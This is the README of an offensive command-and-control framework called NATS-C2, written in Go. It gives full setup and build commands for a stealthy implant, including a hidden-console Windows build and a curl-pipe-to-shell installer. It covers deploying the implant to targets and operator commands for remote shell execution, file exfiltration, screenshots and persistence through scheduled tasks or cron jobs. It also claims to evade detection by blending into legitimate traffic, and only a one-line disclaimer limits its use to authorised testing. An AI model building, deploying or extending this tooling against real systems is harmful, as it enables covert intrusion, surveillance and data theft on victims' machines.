# noPROXY_c2s – NATS‑C2

**NATS‑based Command & Control with end‑to‑end encryption, multi‑server failover, JWT authentication, and built‑in post‑exploitation modules.**  
This project provides a production‑ready implant and operator console written in Go, designed for stealthy red team operations or authorised penetration testing.

---

## Overview

The `nats-c2` component implements a lightweight C2 channel over [NATS](https://nats.io/) – a high‑performance messaging system used in cloud‑native environments. By blending C2 traffic with legitimate microservice traffic, the implant evades many detection mechanisms.

Key design choices:

- **Go binaries** – single‑file, no runtime dependencies, cross‑compiled for Windows and Linux.
- **AES‑GCM encryption** – all messages (heartbeats, commands, results, exfiltrated data) are encrypted with a 256‑bit key. Even if traffic is captured, the payloads are unreadable.
- **Multi‑server failover** – the implant tries a list of NATS servers; if one fails, it automatically switches to the next.
- **JWT authentication** – uses NATS 2.0 JWT credentials to prevent unauthorised agents from connecting.
- **Modular post‑ex** – supports shell command execution, file upload/download, screenshots, and persistence installation.

---

## Features

| Feature | Description |
|---------|-------------|
| Shell commands | Execute arbitrary system commands via `shell` |
| File upload | Retrieve files from the implant (`upload`) |
| File download | Push files to the implant (`download`) |
| Screenshot | Capture the desktop and exfiltrate as PNG |
| Persistence | Install as a scheduled task (Windows) or cron job (Linux) |
| Heartbeat | Periodic online status updates (`heartbeat`) |
| Multi‑server | Automatic failover across multiple NATS endpoints |
| Encryption | AES‑GCM for all traffic |
| JWT auth | Credential‑based authentication for the implant |

---

## Repository Structure

```
nats-c2/
├── implant.go          # Implant code (victim side)
├── operator.go         # Operator console (C2 side)
├── generate_key.go     # Utility to generate a random AES‑256 key
├── go.mod              # Go module definition
├── go.sum              # Dependency checksums
└── README.md           # This file
```

---

## Prerequisites

- **Go 1.21+** (to compile)
- **NATS server** – you can run a local instance or use a cloud‑hosted NATS service.
- **nsc** – NATS JWT management tool (optional if you use static credentials).  
  Install with:  
  ```bash
  curl -sf https://binaries.nats.dev/nats-io/nsc/v2@latest | sh
  sudo mv nsc /usr/local/bin/
  ```

---

## Setup

### 1. Clone the repository

```bash
git clone https://git.churchofmalware.org/ek0mssavi0r/noPROXY_c2s.git
cd noPROXY_c2s/nats-c2
```

### 2. Generate an AES encryption key

Run the provided utility:

```bash
go run generate_key.go
```

Output example:
```
rAEUBb5Id9HO3m3BZ+G5PSqBaceVJly4lbjbSSImz+c=
```

Copy this base64 string. You will need to paste it into **both** `implant.go` and `operator.go` as the value of `b64Key`.

### 3. Configure JWT authentication (optional but recommended)

If you want to restrict which implants can connect to your NATS server, generate JWT credentials:

```bash
# Create an operator (root of trust)
nsc add operator --name C2Operator

# Create an account
nsc add account --name C2Account

# Create a user for implants
nsc add user --name C2Implant

# Generate the credentials file
nsc generate creds --account C2Account --user C2Implant > implant.creds
```

Place `implant.creds` in the same directory as the implant binary when deployed.

Alternatively, you can run without JWT by removing the `UserCredentials` option in the `connectWithRetries` function – the code already falls back to no auth if the file is missing.

### 4. Configure NATS server addresses

Edit `implant.go` and `operator.go` and adjust the `natsServers` / `natsURL` variables to point to your NATS infrastructure.

```go
var natsServers = []string{
    "nats://your-server-1:4222",
    "nats://your-server-2:4222",
}
```

### 5. Build the binaries

```bash
# Build the operator (runs on your C2 machine)
go build -o operator operator.go

# Build the Windows implant (hide console window)
GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui" -o implant.exe implant.go

# Build the Linux implant
GOOS=linux GOARCH=amd64 go build -o implant implant.go
```

---

## Usage

### Start the NATS server

If you are running a local NATS server:

```bash
nats-server -p 4222
```

For JWT‑enabled servers, generate a configuration file with `nsc generate config --mem-resolver --config-file server.conf` and start with:

```bash
nats-server -c server.conf
```

### Run the operator console

```bash
./operator
```

The operator will connect to the configured NATS server and present a prompt. It automatically subscribes to heartbeats, results, and file uploads from all agents.

### Deploy the implant

Copy the implant binary (and `implant.creds` if used) to the target machine and execute it. The implant will:

- Connect to the first available NATS server
- Send an initial heartbeat
- Subscribe to its command topic (`c2.<agent-id>.tasks`)
- Send heartbeats every 30 seconds

No interactive output is visible on the target (Windows GUI build hides the console).

### Available commands

From the operator prompt:

| Command | Syntax | Description |
|---------|--------|-------------|
| `list` | `list` | Show agents that have sent a heartbeat in the last 90 seconds |
| `shell` | `<agent-id> shell <command>` | Execute a system command on the agent |
| `upload` | `<agent-id> upload <local_path>` | Upload a file from the agent to the operator (exfil) |
| `download` | `<agent-id> download <remote_path>` | Push a file from operator to the agent (the operator will prompt for the local file) |
| `persist` | `<agent-id> persist` | Install persistence (scheduled task / crontab) |
| `screenshot` | `<agent-id> screenshot` | Capture a screenshot and upload it |
| `exit` | `exit` | Quit the operator |

**Note:** The `download` command works by first reading a local file on the operator side, encrypting it, and sending it as a `download` task to the agent. The agent then writes the file to the given path.

#### Example session

```
> list
Active agents:
 - myhost-12345

> myhost-12345 shell whoami
[+] Result from myhost-12345:
root

> myhost-12345 screenshot
[!] File saved: exfil_myhost-12345_1712345678.bin
```

---

## Building for different platforms

Use the standard Go cross‑compilation environment variables:

```bash
# Linux
GOOS=linux GOARCH=amd64 go build -o implant implant.go

# Windows (64-bit, hidden console)
GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui" -o implant.exe implant.go

# macOS (Intel)
GOOS=darwin GOARCH=amd64 go build -o implant implant.go

# macOS (Apple Silicon)
GOOS=darwin GOARCH=arm64 go build -o implant implant.go
```

---

## Customisation

- **Change the AES key** – regenerate with `generate_key.go` and update both source files.
- **Add more NATS servers** – append to the `natsServers` slice.
- **Modify heartbeat interval** – adjust the `time.Sleep(30 * time.Second)` line.
- **Add new commands** – extend the `switch` in `implant.go` and the corresponding logic in `operator.go`.

---

## Troubleshooting

| Issue | Likely cause | Solution |
|-------|--------------|----------|
| Operator cannot connect | NATS server not running or wrong address | Start `nats-server` or correct the URL |
| Implant fails to connect | JWT creds file missing or invalid | Ensure `implant.creds` is present and correct, or remove JWT auth |
| Screenshot not working | `robotgo` library may require additional system dependencies on Linux | Install `libx11-dev`, `libxtst-dev`, `libxrandr-dev`, etc. |
| Uploaded file is corrupted | Encryption/decryption mismatch | Ensure the same `b64Key` is used in both implant and operator |

---

## Legal Disclaimer

> This tool is intended for authorised security testing and educational purposes only.  

---

## Credits

- [NATS](https://nats.io/) – messaging system
- [robotgo](https://github.com/go-vgo/robotgo) – desktop automation and screenshots
- Go standard library – encryption, network, and process execution
